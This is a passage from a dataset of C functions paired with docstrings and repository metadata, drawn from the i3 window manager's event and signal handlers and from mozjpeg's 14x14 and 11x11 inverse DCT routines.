event->window);\n\n        /* The reply data: approximate frame size */\n        Rect r = {\n            config.default_border_width, /* left */\n            config.default_border_width, /* right */\n            render_deco_height(),        /* top */\n            config.default_border_width  /* bottom */\n        };\n        xcb_change_property(\n            conn,\n            XCB_PROP_MODE_REPLACE,\n            event->window,\n            A__NET_FRAME_EXTENTS,\n            XCB_ATOM_CARDINAL, 32, 4,\n            &r);\n        xcb_flush(conn);\n    } else if (event->type == A_WM_CHANGE_STATE) {\n        /* http://tronche.com/gui/x/icccm/sec-4.html#s-4.1.4 */\n        if (event->data.data32[0] == XCB_ICCCM_WM_STATE_ICONIC) {\n            /* For compatiblity reasons, Wine will request iconic state and cannot ensure that the WM has agreed on it;\n             * immediately revert to normal to avoid being stuck in a paused state. */\n            DLOG(\"Client has requested iconic state, rejecting. (window = %d)\\n\", event->window);\n            long data[] = {XCB_ICCCM_WM_STATE_NORMAL, XCB_NONE};\n            xcb_change_property(conn, XCB_PROP_MODE_REPLACE, event->window,\n                                A_WM_STATE, A_WM_STATE, 32, 2, data);\n        } else {\n            DLOG(\"Not handling WM_CHANGE_STATE request. (window = %d, state = %d)\\n\", event->window, event->data.data32[0]);\n        }\n    } else if (event->type == A__NET_CURRENT_DESKTOP) {\n        /* This request is used by pagers and bars to change the current\n         * desktop likely as a result of some user action. We interpret this as\n         * a request to focus the given workspace. See\n         * https://standards.freedesktop.org/wm-spec/latest/ar01s03.html#idm140251368135008\n         * */\n        DLOG(\"Request to change current desktop to index %d\\n\", event->data.data32[0]);\n        Con *ws = ewmh_get_workspace_by_index(event->data.data32[0]);\n        if (ws == NULL) {\n            ELOG(\"Could not determine workspace for this index, ignoring request.\\n\");\n            return;\n        }\n\n        DLOG(\"Handling request to focus workspace %s\\n\", ws->name);\n        workspace_show(ws);\n        tree_render();\n    } else if (event->type == A__NET_WM_DESKTOP) {\n        uint32_t index = event->data.data32[0];\n        DLOG(\"Request to move window %d to EWMH desktop index %d\\n\", event->window, index);\n\n        Con *con = con_by_window_id(event->window);\n        if (con == NULL) {\n            DLOG(\"Couldn't find con for window %d, ignoring the request.\\n\", event->window);\n            return;\n        }\n\n        if (index == NET_WM_DESKTOP_ALL) {\n            /* The window is requesting to be visible on all workspaces, so\n             * let's float it and make it sticky. */\n            DLOG(\"The window was requested to be visible on all workspaces, making it sticky and floating.\\n\");\n\n            if (floating_enable(con, false)) {\n                con->floating = FLOATING_AUTO_ON;\n\n                con->sticky = true;\n                ewmh_update_sticky(con->window->id, true);\n                output_push_sticky_windows(focused);\n            }\n        } else {\n            Con *ws = ewmh_get_workspace_by_index(index);\n            if (ws == NULL) {\n                ELOG(\"Could not determine workspace for this index, ignoring request.\\n\");\n                return;\n            }\n\n            con_move_to_workspace(con, ws, true, false, false);\n        }\n\n        tree_render();\n        ewmh_update_wm_desktop();\n    } else if (event->type == A__NET_CLOSE_WINDOW) {\n        /*\n         * Pagers wanting to close a window MUST send a _NET_CLOSE_WINDOW\n         * client message request to the root window.\n         * https://standards.freedesktop.org/wm-spec/wm-spec-latest.html#idm140200472668896\n         */\n        Con *con = con_by_window_id(event->window);\n        if (con) {\n            DLOG(\"Handling _NET_CLOSE_WINDOW request (con = %p)\\n\", con);\n\n            if (event->data.data32[0])\n                last_timestamp = event->data.data32[0];\n\n            tree_close_internal(con, KILL_WINDOW, false);\n            tree_render();\n        } else {\n            DLOG(\"Couldn't find con for _NET_CLOSE_WINDOW request. (window = %d)\\n\", event->window);\n        }\n    } else if (event->type == A__NET_WM_MOVERESIZE) {\n        /*\n         * Client-side decorated Gtk3 windows emit this signal when being\n         * dragged by their GtkHeaderBar\n         */\n        Con *con = con_by_window_id(event->window);\n        if (!con || !con_is_floating(con)) {\n            DLOG(\"Couldn't find con for _NET_WM_MOVERESIZE request, or con not floating (window = %d)\\n\", event->window);\n            return;\n        }\n        DLOG(\"Handling _NET_WM_MOVERESIZE request (con = %p)\\n\", con);\n        uint32_t direction = event->data.data32[2];\n        uint32_t x_root = event->data.data32[0];\n        uint32_t y_root = event->data.data32[1];\n        /* construct fake xcb_button_press_event_t */\n        xcb_button_press_event_t fake = {\n            .root_x = x_root,\n            .root_y = y_root,\n            .event_x = x_root - (con->rect.x),\n            .event_y = y_root - (con->rect.y)};\n        switch (direction) {\n            case _NET_WM_MOVERESIZE_MOVE:\n                floating_drag_window(con->parent, &fake, false);\n                break;\n            case _NET_WM_MOVERESIZE_SIZE_TOPLEFT ... _NET_WM_MOVERESIZE_SIZE_LEFT:\n                floating_resize_window(con->parent, false, &fake);\n                break;\n            default:\n                DLOG(\"_NET_WM_MOVERESIZE direction %d not implemented\\n\", direction);\n                break;\n        }\n    } else if (event->type == A__NET_MOVERESIZE_WINDOW) {\n        DLOG(\"Received _NET_MOVE_RESIZE_WINDOW. Handling by faking a configure request.\\n\");\n\n        void *_generated_event = scalloc(32, 1);\n        xcb_configure_request_event_t *generated_event = _generated_event;\n\n        generated_event->window = event->window;\n        generated_event->response_type = XCB_CONFIGURE_REQUEST;\n\n        generated_event->value_mask = 0;\n        if (event->data.data32[0] & _NET_MOVERESIZE_WINDOW_X) {\n            generated_event->value_mask |= XCB_CONFIG_WINDOW_X;\n            generated_event->x = event->data.data32[1];\n        }\n        if (event->data.data32[0] & _NET_MOVERESIZE_WINDOW_Y) {\n            generated_event->value_mask |= XCB_CONFIG_WINDOW_Y;\n            generated_event->y = event->data.data32[2];\n        }\n        if (event->data.data32[0] & _NET_MOVERESIZE_WINDOW_WIDTH) {\n            generated_event->value_mask |= XCB_CONFIG_WINDOW_WIDTH;\n            generated_event->width = event->data.data32[3];\n        }\n        if (event->data.data32[0] & _NET_MOVERESIZE_WINDOW_HEIGHT) {\n            generated_event->value_mask |= XCB_CONFIG_WINDOW_HEIGHT;\n            generated_event->height = event->data.data32[4];\n        }\n\n        handle_configure_request(generated_event);\n        FREE(generated_event);\n    } else {\n        DLOG(\"Skipping client message for unhandled type %d\\n\", event->type);\n    }\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Called when a window changes its WM_WINDOW_ROLE.\n *\n */\n", "func_signal": "static bool handle_windowrole_change(Con *con, xcb_get_property_reply_t *prop)", "code": "{\n    window_update_role(con->window, prop);\n\n    con = remanage_window(con);\n\n    return true;\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Attach gdb to pid_parent and dump a backtrace to i3-backtrace.$pid in the\n * tmpdir\n */\n", "func_signal": "static int sighandler_backtrace(void)", "code": "{\n    char *tmpdir = getenv(\"TMPDIR\");\n    if (tmpdir == NULL)\n        tmpdir = \"/tmp\";\n\n    pid_t pid_parent = getpid();\n\n    char *filename = NULL;\n    int suffix = 0;\n    /* Find a unique filename for the backtrace (since the PID of i3 stays the\n     * same), so that we don\u2019t overwrite earlier backtraces. */\n    do {\n        FREE(filename);\n        sasprintf(&filename, \"%s/i3-backtrace.%d.%d.txt\", tmpdir, pid_parent, suffix);\n        suffix++;\n    } while (path_exists(filename));\n\n    pid_t pid_gdb = fork();\n    if (pid_gdb < 0) {\n        DLOG(\"Failed to fork for GDB\\n\");\n        return -1;\n    } else if (pid_gdb == 0) {\n        /* child */\n        int stdin_pipe[2],\n            stdout_pipe[2];\n\n        if (pipe(stdin_pipe) == -1) {\n            ELOG(\"Failed to init stdin_pipe\\n\");\n            return -1;\n        }\n        if (pipe(stdout_pipe) == -1) {\n            ELOG(\"Failed to init stdout_pipe\\n\");\n            return -1;\n        }\n\n        /* close standard streams in case i3 is started from a terminal; gdb\n         * needs to run without controlling terminal for it to work properly in\n         * this situation */\n        close(STDIN_FILENO);\n        close(STDOUT_FILENO);\n        close(STDERR_FILENO);\n\n        /* We provide pipe file descriptors for stdin/stdout because gdb < 7.5\n         * crashes otherwise, see\n         * https://sourceware.org/bugzilla/show_bug.cgi?id=14114 */\n        dup2(stdin_pipe[0], STDIN_FILENO);\n        dup2(stdout_pipe[1], STDOUT_FILENO);\n\n        char *pid_s, *gdb_log_cmd;\n        sasprintf(&pid_s, \"%d\", pid_parent);\n        sasprintf(&gdb_log_cmd, \"set logging file %s\", filename);\n\n        char *args[] = {\n            \"gdb\",\n            start_argv[0],\n            \"-p\",\n            pid_s,\n            \"-batch\",\n            \"-nx\",\n            \"-ex\", gdb_log_cmd,\n            \"-ex\", \"set logging on\",\n            \"-ex\", \"bt full\",\n            \"-ex\", \"quit\",\n            NULL};\n        execvp(args[0], args);\n        DLOG(\"Failed to exec GDB\\n\");\n        exit(EXIT_FAILURE);\n    }\n    int status = 0;\n\n    waitpid(pid_gdb, &status, 0);\n\n    /* see if the backtrace was successful or not */\n    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {\n        DLOG(\"GDB did not run properly\\n\");\n        return -1;\n    } else if (!path_exists(filename)) {\n        DLOG(\"GDB executed successfully, but no backtrace was generated\\n\");\n        return -1;\n    }\n    return 1;\n}", "path": "i3/src/sighandler.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * When the user moves the mouse but does not change the active window\n * (e.g. when having no windows opened but moving mouse on the root screen\n * and crossing virtual screen boundaries), this callback gets called.\n *\n */\n", "func_signal": "static void handle_motion_notify(xcb_motion_notify_event_t *event)", "code": "{\n    last_timestamp = event->time;\n\n    /* Skip events where the pointer was over a child window, we are only\n     * interested in events on the root window. */\n    if (event->child != XCB_NONE)\n        return;\n\n    Con *con;\n    if ((con = con_by_frame_id(event->event)) == NULL) {\n        DLOG(\"MotionNotify for an unknown container, checking if it crosses screen boundaries.\\n\");\n        check_crossing_screen_boundary(event->root_x, event->root_y);\n        return;\n    }\n\n    if (config.disable_focus_follows_mouse)\n        return;\n\n    if (con->layout != L_DEFAULT && con->layout != L_SPLITV && con->layout != L_SPLITH)\n        return;\n\n    /* see over which rect the user is */\n    Con *current;\n    TAILQ_FOREACH_REVERSE (current, &(con->nodes_head), nodes_head, nodes) {\n        if (!rect_contains(current->deco_rect, event->event_x, event->event_y))\n            continue;\n\n        /* We found the rect, let\u2019s see if this window is focused */\n        if (TAILQ_FIRST(&(con->focus_head)) == current)\n            return;\n\n        con_focus(current);\n        x_push_changes(croot);\n        return;\n    }\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Opens a separate connection to X11 for placeholder windows when restoring\n * layouts. This is done as a safety measure (users can xkill a placeholder\n * window without killing their window manager) and for better isolation, both\n * on the wire to X11 and thus also in the code.\n *\n */\n", "func_signal": "void restore_connect(void)", "code": "{\n    if (restore_conn != NULL) {\n        /* This is not the initial connect, but a reconnect, most likely\n         * because our X11 connection was killed (e.g. by a user with xkill. */\n        ev_io_stop(main_loop, xcb_watcher);\n        ev_prepare_stop(main_loop, xcb_prepare);\n\n        placeholder_state *state;\n        while (!TAILQ_EMPTY(&state_head)) {\n            state = TAILQ_FIRST(&state_head);\n            TAILQ_REMOVE(&state_head, state, state);\n            free(state);\n        }\n\n        /* xcb_disconnect leaks memory in libxcb versions earlier than 1.11,\n         * but it\u2019s the right function to call. See\n         * https://cgit.freedesktop.org/xcb/libxcb/commit/src/xcb_conn.c?id=4dcbfd77b\n         */\n        xcb_disconnect(restore_conn);\n        free(xcb_watcher);\n        free(xcb_prepare);\n    }\n\n    int screen;\n    restore_conn = xcb_connect(NULL, &screen);\n    if (restore_conn == NULL || xcb_connection_has_error(restore_conn)) {\n        if (restore_conn != NULL) {\n            xcb_disconnect(restore_conn);\n        }\n#ifdef I3_ASAN_ENABLED\n        __lsan_do_leak_check();\n#endif\n        errx(EXIT_FAILURE, \"Cannot open display\");\n    }\n\n    xcb_watcher = scalloc(1, sizeof(struct ev_io));\n    xcb_prepare = scalloc(1, sizeof(struct ev_prepare));\n\n    ev_io_init(xcb_watcher, restore_xcb_got_event, xcb_get_file_descriptor(restore_conn), EV_READ);\n    ev_io_start(main_loop, xcb_watcher);\n\n    ev_prepare_init(xcb_prepare, restore_xcb_prepare_cb);\n    ev_prepare_start(main_loop, xcb_prepare);\n}", "path": "i3/src/restore_layout.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Configured a signal handler to gracefully handle crashes and allow the user\n * to generate a backtrace and rescue their session.\n *\n */\n", "func_signal": "void setup_signal_handler(void)", "code": "{\n    struct sigaction action;\n\n    action.sa_sigaction = handle_signal;\n    action.sa_flags = SA_NODEFER | SA_RESETHAND | SA_SIGINFO;\n    sigemptyset(&action.sa_mask);\n\n    /* Catch all signals with default action \"Core\", see signal(7) */\n    if (sigaction(SIGQUIT, &action, NULL) == -1 ||\n        sigaction(SIGILL, &action, NULL) == -1 ||\n        sigaction(SIGABRT, &action, NULL) == -1 ||\n        sigaction(SIGFPE, &action, NULL) == -1 ||\n        sigaction(SIGSEGV, &action, NULL) == -1)\n        ELOG(\"Could not setup signal handler.\\n\");\n}", "path": "i3/src/sighandler.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Handles ConfigureNotify events for the root window, which are generated when\n * the monitor configuration changed.\n *\n */\n", "func_signal": "static void handle_configure_notify(xcb_configure_notify_event_t *event)", "code": "{\n    if (event->event != root) {\n        DLOG(\"ConfigureNotify for non-root window 0x%08x, ignoring\\n\", event->event);\n        return;\n    }\n    DLOG(\"ConfigureNotify for root window 0x%08x\\n\", event->event);\n\n    if (force_xinerama) {\n        return;\n    }\n    randr_query_outputs();\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Expose event means we should redraw our windows (= title bar)\n *\n */\n", "func_signal": "static void handle_expose_event(xcb_expose_event_t *event)", "code": "{\n    Con *parent;\n\n    DLOG(\"window = %08x\\n\", event->window);\n\n    if ((parent = con_by_frame_id(event->window)) == NULL) {\n        LOG(\"expose event for unknown window, ignoring\\n\");\n        return;\n    }\n\n    /* Since we render to our surface on every change anyways, expose events\n     * only tell us that the X server lost (parts of) the window contents. */\n    draw_util_copy_surface(&(parent->frame_buffer), &(parent->frame),\n                           0, 0, 0, 0, parent->rect.width, parent->rect.height);\n    xcb_flush(conn);\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * A destroy notify event is sent when the window is not unmapped, but\n * immediately destroyed (for example when starting a window and immediately\n * killing the program which started it).\n *\n * We just pass on the event to the unmap notify handler (by copying the\n * important fields in the event data structure).\n *\n */\n", "func_signal": "static void handle_destroy_notify_event(xcb_destroy_notify_event_t *event)", "code": "{\n    DLOG(\"destroy notify for 0x%08x, 0x%08x\\n\", event->event, event->window);\n\n    xcb_unmap_notify_event_t unmap;\n    unmap.sequence = event->sequence;\n    unmap.event = event->event;\n    unmap.window = event->window;\n\n    handle_unmap_notify_event(&unmap);\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 14x14 output block.\n *\n * Optimized algorithm with 20 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/28).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_14x14(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp10, tmp11, tmp12, tmp13, tmp14, tmp15, tmp16;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24, tmp25, tmp26;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 14];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    z1 += ONE << (CONST_BITS - PASS1_BITS - 1);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z2 = MULTIPLY(z4, FIX(1.274162392));         /* c4 */\n    z3 = MULTIPLY(z4, FIX(0.314692123));         /* c12 */\n    z4 = MULTIPLY(z4, FIX(0.881747734));         /* c8 */\n\n    tmp10 = z1 + z2;\n    tmp11 = z1 + z3;\n    tmp12 = z1 - z4;\n\n    tmp23 = RIGHT_SHIFT(z1 - LEFT_SHIFT(z2 + z3 - z4, 1),\n                        CONST_BITS - PASS1_BITS); /* c0 = (c4+c12-c8)*2 */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    z3 = MULTIPLY(z1 + z2, FIX(1.105676686));    /* c6 */\n\n    tmp13 = z3 + MULTIPLY(z1, FIX(0.273079590)); /* c2-c6 */\n    tmp14 = z3 - MULTIPLY(z2, FIX(1.719280954)); /* c6+c10 */\n    tmp15 = MULTIPLY(z1, FIX(0.613604268)) -     /* c10 */\n            MULTIPLY(z2, FIX(1.378756276));      /* c2 */\n\n    tmp20 = tmp10 + tmp13;\n    tmp26 = tmp10 - tmp13;\n    tmp21 = tmp11 + tmp14;\n    tmp25 = tmp11 - tmp14;\n    tmp22 = tmp12 + tmp15;\n    tmp24 = tmp12 - tmp15;\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n    tmp13 = LEFT_SHIFT(z4, CONST_BITS);\n\n    tmp14 = z1 + z3;\n    tmp11 = MULTIPLY(z1 + z2, FIX(1.334852607));           /* c3 */\n    tmp12 = MULTIPLY(tmp14, FIX(1.197448846));             /* c5 */\n    tmp10 = tmp11 + tmp12 + tmp13 - MULTIPLY(z1, FIX(1.126980169)); /* c3+c5-c1 */\n    tmp14 = MULTIPLY(tmp14, FIX(0.752406978));             /* c9 */\n    tmp16 = tmp14 - MULTIPLY(z1, FIX(1.061150426));        /* c9+c11-c13 */\n    z1    -= z2;\n    tmp15 = MULTIPLY(z1, FIX(0.467085129)) - tmp13;        /* c11 */\n    tmp16 += tmp15;\n    z1    += z4;\n    z4    = MULTIPLY(z2 + z3, -FIX(0.158341681)) - tmp13;  /* -c13 */\n    tmp11 += z4 - MULTIPLY(z2, FIX(0.424103948));          /* c3-c9-c13 */\n    tmp12 += z4 - MULTIPLY(z3, FIX(2.373959773));          /* c3+c5-c13 */\n    z4    = MULTIPLY(z3 - z2, FIX(1.405321284));           /* c1 */\n    tmp14 += z4 + tmp13 - MULTIPLY(z3, FIX(1.6906431334)); /* c1+c9-c11 */\n    tmp15 += z4 + MULTIPLY(z2, FIX(0.674957567));          /* c1+c11-c5 */\n\n    tmp13 = LEFT_SHIFT(z1 - z3, PASS1_BITS);\n\n    /* Final output stage */\n\n    wsptr[8 * 0]  = (int)RIGHT_SHIFT(tmp20 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 13] = (int)RIGHT_SHIFT(tmp20 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1]  = (int)RIGHT_SHIFT(tmp21 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 12] = (int)RIGHT_SHIFT(tmp21 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2]  = (int)RIGHT_SHIFT(tmp22 + tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 11] = (int)RIGHT_SHIFT(tmp22 - tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3]  = (int)(tmp23 + tmp13);\n    wsptr[8 * 10] = (int)(tmp23 - tmp13);\n    wsptr[8 * 4]  = (int)RIGHT_SHIFT(tmp24 + tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9]  = (int)RIGHT_SHIFT(tmp24 - tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5]  = (int)RIGHT_SHIFT(tmp25 + tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8]  = (int)RIGHT_SHIFT(tmp25 - tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6]  = (int)RIGHT_SHIFT(tmp26 + tmp16, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7]  = (int)RIGHT_SHIFT(tmp26 - tmp16, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 14 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 14; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    z1 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n    z4 = (JLONG)wsptr[4];\n    z2 = MULTIPLY(z4, FIX(1.274162392));         /* c4 */\n    z3 = MULTIPLY(z4, FIX(0.314692123));         /* c12 */\n    z4 = MULTIPLY(z4, FIX(0.881747734));         /* c8 */\n\n    tmp10 = z1 + z2;\n    tmp11 = z1 + z3;\n    tmp12 = z1 - z4;\n\n    tmp23 = z1 - LEFT_SHIFT(z2 + z3 - z4, 1);    /* c0 = (c4+c12-c8)*2 */\n\n    z1 = (JLONG)wsptr[2];\n    z2 = (JLONG)wsptr[6];\n\n    z3 = MULTIPLY(z1 + z2, FIX(1.105676686));    /* c6 */\n\n    tmp13 = z3 + MULTIPLY(z1, FIX(0.273079590)); /* c2-c6 */\n    tmp14 = z3 - MULTIPLY(z2, FIX(1.719280954)); /* c6+c10 */\n    tmp15 = MULTIPLY(z1, FIX(0.613604268)) -     /* c10 */\n            MULTIPLY(z2, FIX(1.378756276));      /* c2 */\n\n    tmp20 = tmp10 + tmp13;\n    tmp26 = tmp10 - tmp13;\n    tmp21 = tmp11 + tmp14;\n    tmp25 = tmp11 - tmp14;\n    tmp22 = tmp12 + tmp15;\n    tmp24 = tmp12 - tmp15;\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z4 = (JLONG)wsptr[7];\n    z4 = LEFT_SHIFT(z4, CONST_BITS);\n\n    tmp14 = z1 + z3;\n    tmp11 = MULTIPLY(z1 + z2, FIX(1.334852607));           /* c3 */\n    tmp12 = MULTIPLY(tmp14, FIX(1.197448846));             /* c5 */\n    tmp10 = tmp11 + tmp12 + z4 - MULTIPLY(z1, FIX(1.126980169)); /* c3+c5-c1 */\n    tmp14 = MULTIPLY(tmp14, FIX(0.752406978));             /* c9 */\n    tmp16 = tmp14 - MULTIPLY(z1, FIX(1.061150426));        /* c9+c11-c13 */\n    z1    -= z2;\n    tmp15 = MULTIPLY(z1, FIX(0.467085129)) - z4;           /* c11 */\n    tmp16 += tmp15;\n    tmp13 = MULTIPLY(z2 + z3, -FIX(0.158341681)) - z4;     /* -c13 */\n    tmp11 += tmp13 - MULTIPLY(z2, FIX(0.424103948));       /* c3-c9-c13 */\n    tmp12 += tmp13 - MULTIPLY(z3, FIX(2.373959773));       /* c3+c5-c13 */\n    tmp13 = MULTIPLY(z3 - z2, FIX(1.405321284));           /* c1 */\n    tmp14 += tmp13 + z4 - MULTIPLY(z3, FIX(1.6906431334)); /* c1+c9-c11 */\n    tmp15 += tmp13 + MULTIPLY(z2, FIX(0.674957567));       /* c1+c11-c5 */\n\n    tmp13 = LEFT_SHIFT(z1 - z3, CONST_BITS) + z4;\n\n    /* Final output stage */\n\n    outptr[0]  = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[13] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[1]  = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[12] = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[2]  = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[11] = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[3]  = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[10] = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[4]  = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[9]  = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[5]  = range_limit[(int)RIGHT_SHIFT(tmp25 + tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[8]  = range_limit[(int)RIGHT_SHIFT(tmp25 - tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[6]  = range_limit[(int)RIGHT_SHIFT(tmp26 + tmp16,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[7]  = range_limit[(int)RIGHT_SHIFT(tmp26 - tmp16,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing an 11x11 output block.\n *\n * Optimized algorithm with 24 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/22).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_11x11(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp10, tmp11, tmp12, tmp13, tmp14;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24, tmp25;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 11];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    tmp10 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    tmp10 = LEFT_SHIFT(tmp10, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    tmp10 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    tmp20 = MULTIPLY(z2 - z3, FIX(2.546640132));     /* c2+c4 */\n    tmp23 = MULTIPLY(z2 - z1, FIX(0.430815045));     /* c2-c6 */\n    z4 = z1 + z3;\n    tmp24 = MULTIPLY(z4, -FIX(1.155664402));         /* -(c2-c10) */\n    z4 -= z2;\n    tmp25 = tmp10 + MULTIPLY(z4, FIX(1.356927976));  /* c2 */\n    tmp21 = tmp20 + tmp23 + tmp25 -\n            MULTIPLY(z2, FIX(1.821790775));          /* c2+c4+c10-c6 */\n    tmp20 += tmp25 